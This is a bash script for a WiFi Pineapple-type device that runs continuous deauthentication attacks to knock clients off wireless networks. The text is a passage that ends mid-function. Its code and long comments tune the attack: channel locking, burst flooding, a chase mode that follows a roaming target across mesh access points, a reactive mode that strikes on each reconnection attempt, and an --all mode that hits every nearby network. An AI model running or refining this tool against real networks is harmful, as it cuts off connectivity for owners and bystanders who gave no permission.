#!/bin/bash
# deauth.sh - Deauthenticate WiFi clients via PineAP. For clients you're NOT
# connected to (an outside attacker knocking clients off a WiFi network).
# Wraps PINEAPPLE_DEAUTH_CLIENT. For LAN-side disconnection when you ARE on
# the network, use deadnet.sh instead - different tool, different trust model.
#
# Only works on 2.4GHz/non-DFS 5GHz; PMF/WPA3/6GHz networks are resistant to
# this by design.
#
# Per Hak5's own docs: "Networks which utilize Protected Management Frames
# (PMF) or the 802.11w standard will not be susceptible to injected
# disconnection packets. All networks utilizing WPA3 also enable Protected
# Management Frames... Some clients ignore disconnection attempts
# deliberately regardless of the network type or channel." That's a
# protocol-level ceiling, not a bug in this script - no deauth tool can
# beat it. What this script CAN do is maximize pressure within that ceiling
# (see --burst).
#
# A single DEAUTH_CLIENT call only sends one round of disconnect packets -
# real clients reassociate within a second or two, so this now REPEATS the
# attack continuously (like a real deauth flood) until you stop it, instead
# of firing once and exiting. Foreground: Ctrl+C stops it. Launched with
# --background (what the wifi_deauth payload does): use --stop.
#
# "Works sometimes" against a client that mostly stays connected (confirmed
# via a real ping -t transcript showing occasional timeouts among mostly-
# successful replies) is the EXPECTED signature of a client that reconnects
# fast, not evidence the attack is broken - see --burst below, which raises
# disruption pressure per window, and Hak5's own docs (quoted further down)
# on PMF/802.11w and clients that deliberately ignore disconnects.
#
# BUG FOUND AND FIXED (live-diagnosed): recon hops radio channels FAST -
# confirmed by sampling `iw dev wlan1mon info` once a second, it showed a
# DIFFERENT channel on almost every sample. Hak5's own docs say
# DEAUTH_CLIENT "returns immediately... in the background, the PineAP
# system will transmit" the packets - it's fire-and-forget, not
# synchronous, and does not itself guarantee the radio is actually parked
# on the target's channel the instant it transmits. If hopping had already
# moved on by then, the deauth frame went out on the WRONG channel and did
# nothing - the command still "succeeded" with no error, so this looked
# exactly like "deauth just doesn't work" from the outside. Every attack
# loop below now locks the radio to the target's channel (via the
# official PINEAPPLE_EXAMINE_CHANNEL, confirmed live it reliably holds)
# immediately before each transmission, and resets to normal hopping when
# stopped.
#
# Target defaults to FF:FF:FF:FF:FF:FF (every client of the AP) without
# asking - picking one specific client isn't the normal case, so --pick no
# longer prompts for it. Pass --target explicitly if you want just one.
#
# BUG FOUND AND FIXED (live-diagnosed - the real explanation for reports
# that "the whole network only gets deauthed sometimes"): --all used to
# source its target list from recon's hostap_client table (which AP each
# specific client MAC is associated to). Checked that table directly on a
# real device mid-investigation and found it completely EMPTY - recon had
# never recorded a single client association, so every round of the old
# --all found zero targets and sent NOTHING, not "spread thin across many
# devices". Hak5's own docs say the target argument accepts
# "FF:FF:FF:FF:FF:FF for all clients" - broadcast target already
# disconnects every client of a BSSID with no per-client MAC needed at
# all. --all now attacks every AP recon has beaconed from (the `ssid`
# table - reliably populated, --scan/--ssid/--pick already depend on it)
# with a broadcast target instead - the same proven mechanism --ssid/
# --bssid already use, just applied to every nearby AP instead of one.
#
# IMPORTANT: only use this against networks/clients you are authorized to
# test. Deauthenticating devices you don't own or don't have permission to
# test may be illegal in your jurisdiction.
#
# Usage:
#   deauth.sh --bssid AA:BB:CC:DD:EE:FF [--target MAC] --channel 6
#   deauth.sh --ssid "SSID name" [--target MAC]
#   deauth.sh --all
#   deauth.sh --scan
#   deauth.sh --pick
#   deauth.sh --stop
#   deauth.sh --status
#   deauth.sh                interactive mode
#
# Options:
#   --bssid MAC       BSSID (MAC) of one specific access point
#   --ssid NAME         Attack EVERY AP recon has seen broadcasting this exact
#                          SSID, not just one BSSID - the normal case when
#                          several access points share one name (a mesh
#                          network, or just unrelated routers using the same
#                          default name). --scan/--pick group by SSID for
#                          exactly this reason.
#   --target MAC       MAC of the client to disconnect (default: FF:FF:FF:FF:FF:FF, every client - you don't normally need to set this)
#   --channel N          Channel to send disconnect packets on (only with --bssid - --ssid looks channels up per-AP itself)
#   --interval SECONDS      Delay between repeat rounds while attacking (default: 2)
#   --burst N               Deauth calls sent back-to-back within each
#                              channel-locked window before sleeping
#                              (default: 3). More packets per window = more
#                              disruption pressure on clients that reconnect
#                              fast - raise this if a target seems to only
#                              partially disconnect. Doesn't help at all
#                              against PMF/WPA3 (see above) - that's a wall,
#                              not a density problem.
#   (--second-radio / raw injection on the internal radio: REMOVED. Caused
#    repeated hard hangs on real hardware - the kernel went silent with no
#    panic/oops trace, meaning a genuine USB/firmware-level lockup needing
#    a manual power cycle, not a soft crash. Also, "internal only" was
#    never a real choice via official commands either way - confirmed
#    live that DEAUTH_CLIENT/PINEAPPLE_EXAMINE_CHANNEL take no radio-
#    select parameter and always drive whichever radio PineAP itself
#    designates.)
#
#   CHASE MODE (automatic, no flag needed): with --ssid (a mesh/multi-AP
#     group) AND a specific --target (not the FF:FF:FF:FF:FF:FF broadcast
#     default), each round briefly re-checks which BSSID the target MAC
#     is actually transmitting from and prioritizes attacking THAT one -
#     instead of blind round-robin across every AP on a fixed schedule
#     regardless of where the target actually is. Built specifically for
#     mesh networks with roaming (802.11k/v/r): kicking a client off one
#     AP just bounces it to a sibling AP near-invisibly, so the real fix
#     isn't more attack surface, it's tracking where the client actually
#     went and following it there. See find_target_bssid() below. Falls
#     back to normal round-robin whenever the target hasn't been sighted
#     yet (unknown location - attack broadly until found).
#
#   REACTIVE MODE (--reactive flag, needs a specific --target): a
#     different strategy from chase mode above, and mutually exclusive
#     with it - chase mode still polls on a schedule (just prioritizing
#     smartly), reactive mode replaces the schedule entirely with an
#     event trigger. Live testing found that once a target IS located,
#     escalating burst pressure (3->5 packets/round) against it still had
#     ZERO observed effect - the target was reassociating within 1-2
#     seconds, faster than a full multi-AP attack round can even
#     complete once. That means the bottleneck isn't packets-per-round,
#     it's LATENCY: our reaction time to "the target is reconnecting
#     right now" versus theirs. Reactive mode closes that gap directly -
#     see run_reactive_strike() below for the mechanism.
#   --all                  Continuously deauth EVERY AP recon has seen a
#                            beacon from (broadcast target = every client
#                            of it, no per-client tracking needed), using
#                            the Pineapple's own recon database
#                            (/root/recon/recon.db - the same data the
#                            physical Recon screen shows). Re-scans recon
#                            each round, so newly-seen APs get picked up
#                            too. Needs recon to have beaconed at least one
#                            AP - normally just seconds, not the long wait
#                            per-client tracking needed (see the file
#                            header for why this changed).
#   --scan                  List nearby networks seen by recon, grouped by
#                              SSID with an AP count (e.g. "Hotspot (3)") -
#                              several BSSIDs sharing one name show as ONE
#                              entry, not N separate ones. Read-only, no attack.
#   --pick                  Smart guided mode: if not connected to a WiFi
#                              network, scan and let you pick one of the
#                              nearby SSIDs seen by recon (grouped the same
#                              way as --scan - picking one attacks every AP
#                              broadcasting that name); if connected, uses
#                              that specific network directly. Targets ALL
#                              clients by default - pass --target yourself
#                              first if you want one specific client.
#   --no-discover             Skip real client-MAC discovery (see below) -
#                                broadcast target only, starts attacking
#                                immediately instead of a brief listen first.
#   --reactive                EVENT-TRIGGERED STRIKE MODE (needs a specific
#                                --target, not the broadcast default - see
#                                REACTIVE MODE below). Instead of a fixed-
#                                interval polling loop, continuously watches
#                                for the target's own auth/(re)association
#                                frames and fires an immediate priority
#                                burst the instant one is seen, instead of
#                                waiting out a scheduled round. Built
#                                because live testing showed burst
#                                escalation (more packets per round) had
#                                zero effect against a target that
#                                reassociates in 1-2s - the real gap is
#                                LATENCY between our attack cadence and
#                                theirs, not attack strength. Detection
#                                watches plain decoded tcpdump text (grep
#                                on decoded output, deliberately NOT a
#                                `wlan type mgt subtype ...` BPF filter
#                                primitive - see run_reactive_strike()'s
#                                own header comment for why) for
#                                "Authentication"/"Assoc Request"/
#                                "ReAssoc Request" - keyword list
#                                LIVE-VERIFIED against this exact tcpdump
#                                binary via a synthetic pcap (see
#                                run_reactive_strike()'s header comment):
#                                the decoder abbreviates (re)association
#                                frames as "Assoc Request"/"ReAssoc
#                                Request", NOT the full spec names this
#                                originally grepped for - that mismatch
#                                would have silently caught Authentication
#                                frames only and missed every real
#                                (re)association attempt. Fixed and
#                                re-verified. A SECOND, more fundamental
#                                bug found the same way: tcpdump's default
#                                summary line carries NO MAC address at
#                                all for these frame types unless run with
#                                "-e" - meaning the target-MAC match that
#                                runs after the keyword match would have
#                                matched nothing, ever, even with the
#                                keyword fix above. Both tcpdump calls now
#                                pass "-e".
#   --background             Run the attack detached - use --stop to end it.
#   --stop                    Stop a background attack.
#   --status                    Is an attack currently running?
#   -y, --yes              Skip the authorization confirmation
#   -h, --help               This help
#
# Client-MAC discovery (on by default, --bssid/--ssid/--pick, when TARGET
# is left at the default broadcast): before attacking, briefly listens on
# the target's (locked) channel for real client MAC addresses actually
# active there, and - if any are found - targets each of them directly
# with a unicast deauth every round, ALONGSIDE the normal broadcast
# target. WHY: Hak5's docs confirm FF:FF:FF:FF:FF:FF is meant to hit every
# client, but real-world WiFi driver behavior around broadcast-addressed
# management frames varies - some are pickier about them than about a
# frame addressed to their own exact MAC. This closes that gap without
# depending on recon's own client tracking (confirmed elsewhere in this
# file to be empty/unreliable on this device). One-time cost per attack
# start (~2s), not repeated every round. Not used by --all (would mean
# re-discovering on every AP, every round - too expensive to be worth it
# there; --all stays broadcast-only).

set -u
TOOL_NAME="deauth.sh"
PIDFILE="/tmp/pager-deauth.pid"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
. "$SCRIPT_DIR/lib/common.sh"
usage() { print_help "$0"; exit 1; }

BSSID=""; TARGET=""; CHANNEL=""; INTERVAL="2"; BURST="3"; SSID_NAME=""
DO_ALL=0; DO_SCAN=0; DO_PICK=0; BACKGROUND=0; DO_STOP=0; DO_STATUS=0; DISCOVER=1
REACTIVE=0

while [ $# -gt 0 ]; do
    case "$1" in
        --bssid) need_arg "--bssid" "$#"; BSSID="$2"; shift 2 ;;
        --ssid) need_arg "--ssid" "$#"; SSID_NAME="$2"; shift 2 ;;
        --target) need_arg "--target" "$#"; TARGET="$2"; shift 2 ;;
        --channel) need_arg "--channel" "$#"; CHANNEL="$2"; shift 2 ;;
        --interval) need_arg "--interval" "$#"; INTERVAL="$2"; shift 2 ;;
        --burst) need_arg "--burst" "$#"; BURST="$2"; shift 2 ;;
        --reactive) REACTIVE=1; shift ;;
        --no-discover) DISCOVER=0; shift ;;
        --all) DO_ALL=1; shift ;;
        --scan) DO_SCAN=1; shift ;;
        --pick) DO_PICK=1; shift ;;
        --background) BACKGROUND=1; shift ;;
        --stop) DO_STOP=1; shift ;;
        --status) DO_STATUS=1; shift ;;
        -y|--yes) ASSUME_YES=1; shift ;;
        -h|--help) usage ;;
        *) err "Unknown argument: $1"; usage ;;
    esac
done

case "$BURST" in ''|*[!0-9]*) die "'--burst' needs a whole number (got '$BURST')." ;; esac
[ "$BURST" -ge 1 ] || die "'--burst' must be at least 1 (got '$BURST')."

# BUG FOUND AND FIXED: --interval was never validated before being handed
# straight to `sleep "$INTERVAL"` at the bottom of every attack loop. A
# typo'd or malicious value (non-numeric, negative, empty) makes `sleep`
# fail instantly instead of actually delaying - which turns every attack
# loop's "sleep, then repeat" into a tight busy-loop hammering
# PINEAPPLE_EXAMINE_CHANNEL/PINEAPPLE_DEAUTH_CLIENT as fast as the shell
# can call them, with no rate limit at all. Reject obviously-bad input
# up front instead of discovering it as a runaway loop mid-attack.
case "$INTERVAL" in ''|*[!0-9.]*|.|*.*.*) die "'--interval' needs a non-negative number of seconds (got '$INTERVAL')." ;; esac

# --reactive needs a real target to watch for - there's no single device
# to react to with the FF:FF:FF:FF:FF:FF broadcast default (which is
# exactly what happens if --target is left unset), and reacting to "any
# reconnection at all" would just mean firing on the first client that
# happens to auth/associate, not a deliberate choice. Fail clearly here
# rather than silently defaulting to broadcast later and behaving
# unexpectedly.
if [ "$REACTIVE" = "1" ]; then
    [ -z "$TARGET" ] && die "'--reactive' needs a specific --target MAC to watch for - it has no single device to react to without one."
    [ "$(echo "$TARGET" | tr 'a-f' 'A-F')" = "FF:FF:FF:FF:FF:FF" ] && die "'--reactive' needs a specific --target MAC, not the FF:FF:FF:FF:FF:FF broadcast default - it reacts to one device's own reconnection attempts, not everyone's."
    # BUG FOUND AND FIXED: --all's own dispatch block (further down) is a
    # completely separate `if` that always calls run_all_loop and never
    # checks $REACTIVE at all - `deauth.sh --all --reactive --target X`
    # passed both checks just above (a real, non-broadcast target WAS
    # given) and then silently ran the NORMAL --all broadcast attack,
    # discarding --reactive and --target entirely with no indication
    # either was ignored. --all is inherently "every AP, broadcast target,
    # no single device" (see its own header) - fundamentally incompatible
    # with reactive mode's "one specific device" premise. Fail clearly
    # here instead, same "don't silently behave unexpectedly" reasoning as
    # the two checks just above.
    [ "$DO_ALL" = "1" ] && die "'--reactive' cannot be combined with --all (which broadcasts to every AP recon has seen, with no single device to react to). Use --bssid or --ssid with --reactive --target instead."
fi

RECON_DB="/root/recon/recon.db"
# BUG FOUND AND FIXED (live-diagnosed, same class as a bug already fixed
# in the wifi_deauth payload's own picker): scan_ssid_groups(),
# ssid_group_pairs(), and all_ap_pairs() below had NO time filter at all -
# they matched every AP recon has EVER beaconed since the database was
# created, including ones seen once, long ago, that may no longer even be
# broadcasting on that channel (or at all). --ssid and --all both RE-QUERY
# one of these every round during a live attack (see --all's own header
# comment) - meaning a stale entry doesn't just affect the initial picker,
# it can keep an entire attack silently locked onto a dead BSSID/channel
# for its whole run, which plausibly explains reports of deauth having no
# visible effect even against a PMF-free WPA2 network. Recon itself is
# confirmed to update continuously (recon.db rows were only ~16s old when
# checked live), so a real freshness filter is the fix, not a rescan
# trigger. RECON_FRESH_SECONDS is intentionally more generous than the
# payload picker's 120s (180s) since recon's own channel-hop cycle means
# a legitimately-still-there AP might momentarily go a bit longer between
# re-sightings during a live attack - the payload's one-time picker can
# afford to be stricter than a mid-attack re-scan can.
RECON_FRESH_SECONDS=180

# BIG CHANGE (adopting common.sh's shared primitive, extracted from this
# exact duplicated check earlier in this sweep): backed by the one
# canonical pid_running() in lib/common.sh instead of independently
# maintaining this same "PIDFILE + kill -0" logic here too.
is_running() { pid_running "$PIDFILE"; }

# Sentinel (dual-radio passive sensing for --reactive - see
# start_sentinel()'s own header comment further down for the full
# rationale). State/cleanup defined HERE (early, alongside PIDFILE/
# is_running) rather than next to start_sentinel() itself, because --stop
# below needs to call stop_sentinel() unconditionally - same reasoning as
# the unconditional PINEAPPLE_EXAMINE_RESET a few lines down: this file's
# own history found that relying on a loop's normal exit path to run its
# own cleanup is NOT reliable on this device ("the process just died
# without ever reaching its post-loop cleanup line, in practice" - see
# that comment). A function has to be DEFINED before something earlier in
# the script's execution order can call it, so this can't live next to
# start_sentinel() further down without --stop failing with "command not
# found" the one time it actually needs to run.
SENTINEL_PIDFILE="/tmp/pager-deauth-sentinel.pid"
SENTINEL_STATE="/tmp/pager-deauth-sentinel-sighting"
sentinel_running() { pid_running "$SENTINEL_PIDFILE"; }
stop_sentinel() {
    if sentinel_running; then
        kill "$(cat "$SENTINEL_PIDFILE")" 2>/dev/null
    fi
    # BUG FOUND AND FIXED: same orphaned-child-of-a-command-substitution
    # class already found and fixed for bluetooth.sh's l2ping and sniff.sh's
    # watcher re-scans - the sentinel loop's `hit=$(timeout 3 tcpdump ... |
    # grep ... | grep ...)` can't be exec'd (the loop needs $hit back to
    # decide whether to record a sighting), so the plain `kill` above can
    # leave that tcpdump running as an orphan if it lands mid-window.
    # Bounded by its own `timeout 3` either way (unlike the earlier
    # unbounded-orphan bugs elsewhere), but matching this project's own
    # established defense-in-depth pattern costs nothing here. Scoped to
    # wlan0mon specifically, not a blanket `killall tcpdump` - sniff.sh/
    # tracer.sh/pc_link.sh/bluetooth_jam's own scans can legitimately be
    # running concurrently on OTHER interfaces at the same time. Same
    # `ps`+`grep`+`awk '{print $1}'` idiom already used elsewhere in this
    # toolkit (reset.sh, bluetooth.sh --stop) - no `pkill` on this busybox
    # build.
    for _pid in $(ps 2>/dev/null | grep 'tcpdump.*wlan0mon' | grep -v grep | awk '{print $1}'); do
        kill "$_pid" 2>/dev/null
    done
    rm -f "$SENTINEL_PIDFILE" "$SENTINEL_STATE"
    ip link set wlan0 up 2>/dev/null
}

# track_foreground_pid - called as the first line of every run_*_loop
# function (see the long comment above is_running() for the full story of
# why this exists). Only does anything for a FOREGROUND run -
# --background already writes $PIDFILE itself right after backgrounding,
# with the correct subshell PID (matches what this would write anyway, so
# skipping it there just avoids a redundant write, not a correctness
# issue either way).
track_foreground_pid() {
    [ "$BACKGROUND" = "1" ] && return 0
    echo "$BASHPID" > "$PIDFILE"
    trap 'rm -f "$PIDFILE"' EXIT
}

# BUG FOUND, FIXED, AND RE-DIAGNOSED (live-caught, not hypothetical):
# --status/--stop only ever looked at $PIDFILE, which used to only be
# written by --background. A FOREGROUND run whose SSH session drops
# without cleanly delivering a signal (confirmed live - found a real
# leftover `deauth --all` attack loop still running, still holding the
# WiFi channel locked, from a much earlier test in this session,
# completely invisible to --status: "Not running" despite an actual
# attack still going) was untracked and unstoppable through this script's
# own interface - the worst possible failure mode for a tool whose whole
# premise is "only attack what you're authorized to and stop when you
# mean to".
#
# First attempt fixed this by scanning `ps` for any other "scripts/deauth"
# process at --status/--stop time. Took three more live-diagnosed rounds
# just to get the self-exclusion right (a real second `ash -c` wrapper
# process, busybox `ps` truncating command lines past the flags being
# excluded on, and finally `$(...)`'s own subshell showing up as a false
# "stray" of itself since bash keeps "$$" as the ORIGINAL top-level PID
# inside a subshell, not that subshell's real kernel PID) - and even after
# all that, it was fundamentally fragile: any process-listing approach
# has to correctly identify "is this ps entry actually me" from the
# INSIDE, which turned out to be a much deeper rabbit hole than the
# problem deserved.
#
# The actually-robust fix: track a FOREGROUND run in $PIDFILE too, not
# just background ones - each attack loop function now writes its own
# real PID ($BASHPID) to $PIDFILE the moment it starts (foreground only -
# --background already does this via $! right after backgrounding, see
# below) and removes it via an EXIT trap on any clean exit. If the
# process dies WITHOUT that trap firing (SIGKILL, a dropped SSH session
# that never delivers a catchable signal), the file is left behind with a
# genuinely-dead PID - is_running()'s existing `kill -0` check already
# correctly reports that as "not running" (see the stale-PIDFILE cleanup
# right below), which is exactly the outcome wanted: no ps-parsing, no
# self-identification problem, just the same PIDFILE+kill-0 pattern this
# script already trusted for the background case, now covering the
# foreground case too.
if [ "$DO_STATUS" = "1" ]; then
    if is_running; then
        say "Running (PID $(cat "$PIDFILE"))."
    else
        say "Not running."
        # BUG FOUND AND FIXED: a stale $PIDFILE (left behind if a run died
        # without its EXIT trap firing - e.g. SIGKILL) made is_running()
        # correctly report "not running" via its own kill -0 check, but
        # the leftover file itself was never cleaned up here, only in
        # --stop's now-removed "is_running" branch - so a dead PIDFILE
        # could sit around indefinitely (harmless on its own, but noise,
        # and a false "Already running" trap waiting for a reused PID -
        # see --background's own check just below).
        [ -f "$PIDFILE" ] && rm -f "$PIDFILE"
    fi
    if sentinel_running; then
        say "Sentinel (internal radio, passive watch): running (PID $(cat "$SENTINEL_PIDFILE"))."
    fi
    exit 0
fi

if [ "$DO_STOP" = "1" ]; then
    if is_running; then
        kill "$(cat "$PIDFILE")" 2>/dev/null
        rm -f "$PIDFILE"
        say "Stopped."
    else
        say "Nothing running."
        # Same stale-file cleanup as --status above - a dead PID left
        # over from an EXIT-trap-skipping kill shouldn't linger.
        [ -f "$PIDFILE" ] && rm -f "$PIDFILE"
    fi
    # BUG FOUND AND FIXED (live-diagnosed): each attack loop calls
    # PINEAPPLE_EXAMINE_RESET AFTER its while-loop exits, relying on the
    # STOPPING trap to break out of the loop cleanly first. Live-tested
    # that exact pattern (trap set, subshell backgrounded, plain `kill
    # $PID` sent) in isolation - the process just died without ever
    # reaching its post-loop cleanup line, in practice, on this device.
    # So don't rely on it: unconditionally reset here too, regardless of
    # whether the loop's own cleanup happened to run. Without this, a
    # stopped attack could leave the WiFi radio permanently locked to one
    # channel (from the last PINEAPPLE_EXAMINE_CHANNEL call) instead of
    # resuming normal recon hopping - a real, bad state to risk leaving
    # silently. Harmless no-op if hopping was already normal.
    # BUG FOUND AND FIXED (same class as reset.sh's own reset_wifi fix
    # this session): this platform call had no timeout - if the recon/WiFi
    # subsystem is wedged, this line could hang --stop indefinitely
    # instead of just being a harmless no-op. Bounded the same way.
    timeout 10 PINEAPPLE_EXAMINE_RESET >/dev/null 2>&1
    # Same reasoning as PINEAPPLE_EXAMINE_RESET just above, applied to the
    # sentinel subprocess a --reactive run may have started: it's a
    # grandchild of $PIDFILE's process (backgrounded from inside
    # run_reactive_strike), and killing a parent does NOT automatically
    # kill its children in bash - it needs its own explicit stop
    # regardless of whether the main loop's own trap-triggered cleanup
    # happened to run. Unconditional and harmless if no sentinel was ever
    # started (sentinel_running() just returns false, rm -f on files that
    # don't exist is a no-op).
    stop_sentinel
    exit 0
fi

# format_mac AABBCCDDEEFF -> aa:bb:cc:dd:ee:ff (recon.db stores MACs with no
# separators; DEAUTH_CLIENT requires the standard colon format per Hak5's
# own docs).
format_mac() {
    echo "$1" | sed -E 's/(..)(..)(..)(..)(..)(..)/\1:\2:\3:\4:\5:\6/' | tr 'A-F' 'a-f'
}

# is_wifi_connected / connected_bssid now live in lib/common.sh (shared
# with tracer.sh --wifi, which needs the identical "am I actually
# associated" check) - were duplicated here until pulled out.

# channel_of_bssid BSSID_NOCOLONS - look up the real channel for a known AP
# from recon's own beacon data, instead of guessing. This matters: a lot of
# APs (confirmed live - several FRITZ!Box units nearby) run on 5GHz
# channels like 36/40/104/112, not 6 - PINEAPPLE_DEAUTH_CLIENT sends on the
# wrong physical channel and silently does nothing if this is wrong.
#
# BUG FOUND AND FIXED (live-diagnosed - the SAME BLOB/TEXT bug already
# found and fixed for the ssid column in ssid_group_pairs(), missed here
# for bssid): recon.db's schema declares `bssid TEXT`, but confirmed live
# via `typeof(bssid)` that the actual stored values are BLOB - SQLite's
# storage-class comparison rules mean a BLOB value never equals a TEXT
# string literal, even byte-identical. A plain `bssid = '485D35129636'`
# returned ZERO rows against real data that unmistakably exists (confirmed
# present via CAST); `CAST(bssid AS TEXT) = '...'` correctly returned the
# real channel (40). This means channel_of_bssid() has been returning
# EMPTY on every single call - --pick's "already connected" branch was
# silently falling back to its hardcoded "6" default for every 5GHz
# network (confirmed live: this exact mesh runs on 36/40, not 6) instead
# of ever finding the real channel, sending every --pick attack against a
# connected 5GHz AP onto the wrong physical channel the whole time.
channel_of_bssid() {
    local bssid_nc="$1"
    sqlite3 "$RECON_DB" \
        "SELECT channel FROM ssid WHERE type = 8 AND CAST(bssid AS TEXT) = '$bssid_nc' ORDER BY time DESC LIMIT 1;" \
        2>/dev/null
}

# sql_escape STRING - double up single quotes for safe embedding in a SQL
# string literal. SSIDs are attacker-controlled (a nearby AP can broadcast
# literally any name, including one containing a quote) so this isn't
# theoretical - without it, a crafted SSID could break out of the string
# literal in ssid_group_pairs() below.
sql_escape() { printf '%s' "$1" | sed "s/'/''/g"; }

# scan_ssid_groups - AP beacons recon has actually seen (type=8 in the ssid
# table = beacon frame, confirmed live against real recon.db data - type=4
# rows are just probe requests with no SSID/BSSID attached), GROUPED BY
# SSID: several BSSIDs broadcasting the identical name (a mesh network, or
# just unrelated routers sharing a default name) collapse into one row
# with a count, instead of listing each BSSID as its own entry. Prints
# "SSID\tBSSID~CHANNEL;BSSID~CHANNEL;...\tCOUNT\tSIGNAL", strongest
# signal first. Verified live against real recon.db data (a real 8-AP
# "FRITZ!Box 6690 GK" mesh grouped correctly).
scan_ssid_groups() {
    [ -f "$RECON_DB" ] || { err "Recon database not found at $RECON_DB - has recon run yet?"; return 1; }
    command -v sqlite3 >/dev/null 2>&1 || { err "sqlite3 not found on this device."; return 1; }
    local cutoff=$(( $(date +%s) - RECON_FRESH_SECONDS ))
    # BUG FOUND AND FIXED (same BLOB/TEXT class already fixed for the `=`
    # comparisons elsewhere in this file, uncaught here because these are
    # `!=` against a literal, not an `=` against a caller-supplied value):
    # bssid/ssid are BLOB storage class, so `!= ''` (a TEXT literal) is
    # NEVER equal to a BLOB value regardless of content - meaning `!= ''`
    # always evaluates true and filters out nothing, even for a genuinely
    # empty BLOB. Confirmed empirically (local sqlite3 test matching this
    # exact schema pattern: an empty-BLOB ssid passed the uncast `!= ''`
    # check while CAST(...AS TEXT) != '' correctly excluded it). Real
    # impact: a hidden/cloaked AP (which legitimately beacons an empty
    # SSID) would show up as a blank-name row in --scan/--pick's grouped
    # listing instead of being filtered out by this guard as intended.
    sqlite3 -separator '	' "$RECON_DB" \
        "SELECT ssid, GROUP_CONCAT(bssid || '~' || channel, ';'), COUNT(*), MAX(signal)
         FROM (SELECT s.bssid AS bssid, s.ssid AS ssid, s.channel AS channel, MAX(s.signal) AS signal
               FROM ssid s
               WHERE s.type = 8 AND s.bssid IS NOT NULL AND CAST(s.bssid AS TEXT) != '' AND s.ssid IS NOT NULL AND CAST(s.ssid AS TEXT) != ''
                 AND s.time >= $cutoff
               GROUP BY s.bssid)
         GROUP BY ssid ORDER BY MAX(signal) DESC;" \
        2>/dev/null
}

# ssid_group_pairs SSID - "BSSID~CHANNEL" lines (raw hex, no colons yet)
# for every AP recon has seen broadcasting this exact SSID. Used by both
# --ssid direct use and --pick's grouped network picker.
#
# BUG FIXED (live-diagnosed): the ssid column is declared BLOB in recon.db
# (confirmed via its schema), and SQLite's storage-class comparison rules
# mean a BLOB value never equals a TEXT string literal even with
# byte-identical content - a plain `s.ssid = 'AtHome'` matched nothing at
# all despite --scan showing that exact SSID seconds earlier. Casting the
# column to TEXT before comparing fixes it - verified live.
ssid_group_pairs() {
    local name esc cutoff
    name="$1"
    esc=$(sql_escape "$name")
    cutoff=$(( $(date +%s) - RECON_FRESH_SECONDS ))
    # BUG FOUND AND FIXED (same uncast `!= ''` BLOB/TEXT gap as
    # scan_ssid_groups() above - `s.bssid != ''` never excludes anything
    # since a BLOB never equals a TEXT literal; only the CAST'd `s.ssid`
    # equality just below was fixed, this bare `!=` sanity filter was
    # missed).
    sqlite3 -separator '~' "$RECON_DB" \
        "SELECT bssid, channel FROM (
             SELECT s.bssid AS bssid, s.channel AS channel, MAX(s.signal) AS signal
             FROM ssid s
             WHERE s.type = 8 AND s.bssid IS NOT NULL AND CAST(s.bssid AS TEXT) != '' AND CAST(s.ssid AS TEXT) = '$esc'
               AND s.time >= $cutoff
             GROUP BY s.bssid
         );" \
        2>/dev/null
}

# all_ap_pairs - "BSSID~CHANNEL" lines for EVERY AP recon has seen a beacon
# from, regardless of SSID. What --all uses now.
#
# BUG FOUND AND FIXED (live-diagnosed - this is very likely the real
# explanation for "the whole network only gets deauthed sometimes"):
# --all used to source its target list from the hostap_client table (which
# AP each specific client MAC is currently associated to) - live-checked
# this table directly against the real recon.db during this exact
# investigation and found it EMPTY (0 rows, not just "no currently-
# connected" - recon had never recorded a single client association at
# all in this environment). That means every round of the old --all loop
# found zero clients, logged one warning, and sent NO deauth frames at
# all - not "diluted across many devices", literally nothing being sent
# most of the time.
#
# The fix: Hak5's own docs say the target argument accepts
# "FF:FF:FF:FF:FF:FF for all clients" - broadcast-target already
# disconnects every client of a BSSID with no need to know their
# individual MACs first. The `ssid` table (beacon frames, type=8) IS
# reliably populated - --scan/--ssid/--pick already depend on it and work
# - so --all now attacks every AP recon has beaconed from with a
# broadcast target, the same proven mechanism --ssid/--bssid already use,
# instead of depending on per-client tracking that doesn't work here.
# Strictly more thorough too: this catches every nearby AP immediately,
# not just ones recon has already fingerprinted a specific client on.
all_ap_pairs() {
    local cutoff=$(( $(date +%s) - RECON_FRESH_SECONDS ))
    # BUG FOUND AND FIXED (same uncast `!= ''` BLOB/TEXT gap as
    # scan_ssid_groups()/ssid_group_pairs() above).
    sqlite3 -separator '~' "$RECON_DB" \
        "SELECT bssid, channel FROM (
             SELECT s.bssid AS bssid, s.channel AS channel, MAX(s.signal) AS signal
             FROM ssid s
             WHERE s.type = 8 AND s.bssid IS NOT NULL AND CAST(s.bssid AS TEXT) != ''
               AND s.time >= $cutoff
             GROUP BY s.bssid
         );" \
        2>/dev/null
}

# scan_clients_of BSSID_NOCOLONS - clients recon has seen associated to one
# specific AP (same hostap_client/wifi_device join as --all's query, just
# filtered to one BSSID instead of every AP).
#
# BUG FOUND AND FIXED (same BLOB/TEXT class as channel_of_bssid() above):
# wifi_device.mac is declared TEXT but confirmed live via typeof(mac) to
# actually store BLOB, same as ssid.bssid - a plain `wd.mac = '...'` would
# never match. Currently a latent bug rather than an observed live one
# (hostap_client is confirmed empty - 0 rows - in this environment, so
# this function already returns nothing regardless), but fixing it now
# for correctness/whenever that table starts getting populated, same as
# the other two BLOB/TEXT fixes in this file.
scan_clients_of() {
    local bssid_nc="$1"
    sqlite3 -separator '	' "$RECON_DB" \
        "SELECT DISTINCT hc.mac FROM hostap_client hc JOIN wifi_device wd ON hc.hash = wd.hash WHERE CAST(wd.mac AS TEXT) = '$bssid_nc' AND (hc.disconnected_time IS NULL OR hc.disconnected_time = 0);" \
        2>/dev/null
}

if [ "$DO_SCAN" = "1" ]; then
    rows=$(scan_ssid_groups) || exit 1
    if [ -z "$rows" ]; then
        say "No AP beacons seen by recon yet. Let it run a bit longer (or check the physical Recon screen)."
        exit 0
    fi
    say "Nearby networks seen by recon (strongest signal first):"
    printf "  %-28s %-6s %s\n" "SSID" "APs" "SIGNAL"
    echo "$rows" | while IFS="$(printf '\t')" read -r ssid pairs count signal; do
        printf "  %-28s (%s)    %sdBm\n" "$ssid" "$count" "$signal"
    done
    exit 0
fi

if [ "$DO_PICK" = "1" ]; then
    echo "== deauth.sh --pick =="
    if is_wifi_connected; then
        cbssid_nc=""
        cbssid=$(connected_bssid)
        if [ -n "$cbssid" ]; then
            say "Currently connected to AP $cbssid."
            cbssid_nc=$(echo "$cbssid" | tr -d ':' | tr 'a-f' 'A-F')
        else
            say "Connected, but couldn't determine the AP's BSSID via iw - falling back to manual entry."
        fi
        BSSID="$cbssid"
